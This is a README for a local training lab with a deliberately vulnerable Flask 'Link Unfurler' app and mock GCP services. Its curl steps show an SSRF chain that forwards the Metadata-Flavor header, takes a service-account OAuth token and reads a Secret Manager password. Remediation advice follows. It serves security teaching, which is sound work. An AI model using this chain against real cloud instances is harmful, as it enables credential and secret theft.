Cloud Lab 09. GCP-Metadata-SSRF — Flask (Python), self-contained  ✅ (exploit verified on this box)

A "Link Unfurler" web app runs on a GCE instance with an attached service account.
The app has an SSRF sink. GCP's metadata server (metadata.google.internal) requires
the header "Metadata-Flavor: Google" and its default SA token endpoint mints an
OAuth access token. So: SSRF (forwarding Metadata-Flavor: Google) -> SA OAuth token
-> read a Secret Manager secret from the token-protected API. The mock metadata
server is internal (127.0.0.1:9121); the mock Secret Manager is on :9122 and
rejects requests without the stolen Bearer token (HTTP 401).

1: Get the lab:   unzip GCP-Metadata-SSRF.zip && cd 09-GCP-Metadata-SSRF
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   Open in browser:   http://localhost:9120/          <-- {"app":"Link Unfurler (...GCE...)",...}
   # Quick win — SSRF -> SA token -> Secret Manager secret:
   # a) without the Metadata-Flavor header the metadata server refuses (HTTP 403)
   curl -s -G localhost:9120/fetch \
     --data-urlencode 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
   #   -> Missing Metadata-Flavor:Google header
   # b) with the header -> steal the SA OAuth token
   curl -s -G localhost:9120/fetch \
     --data-urlencode 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
     --data-urlencode 'hdr=Metadata-Flavor:Google'
   #   -> {"access_token":"ya29.a0AfB_byC-...","token_type":"Bearer",...}
   # c) use the token against Secret Manager (:9122), then base64-decode payload.data
   curl -s -H 'Authorization: Bearer ya29.a0AfB_byC-GCP-SERVICE-ACCOUNT-OAUTH-TOKEN-EXAMPLE' \
     'localhost:9122/v1/projects/acme-prod-1234/secrets/db-pass/versions/latest:access'
   #   payload.data (base64) -> GCP-Prod-DB-Sup3rSecret!
3: Stop:  Ctrl-C

Requirements:
    Python 3 + Flask                (native run — no Docker, no GCP account)
    curl + base64

Endpoints:
    GET  /                                                              -> banner
    GET  /fetch?url=<url>&hdr=Name:Value                                 -> SSRF sink  [SSRF]
    (mock metadata 127.0.0.1:9121 — needs "Metadata-Flavor: Google")
    GET  /v1/projects/<p>/secrets/<n>/versions/latest:access  (:9122)    -> needs Bearer token

List of Vulnerabilities (all verified on this box):
    SSRF with header control — /fetch fetches any URL and forwards attacker-set
        headers, satisfying the "Metadata-Flavor: Google" guard.
    Service-account token theft — SSRF to the default SA token endpoint returns a
        usable OAuth access token.
    Secret Manager exposure — the stolen token reads a production DB password
        secret.

Remediation: block SSRF egress to metadata.google.internal / 169.254.169.254; use
least-privilege service accounts and workload identity; restrict metadata access
with org policy; monitor token requests.
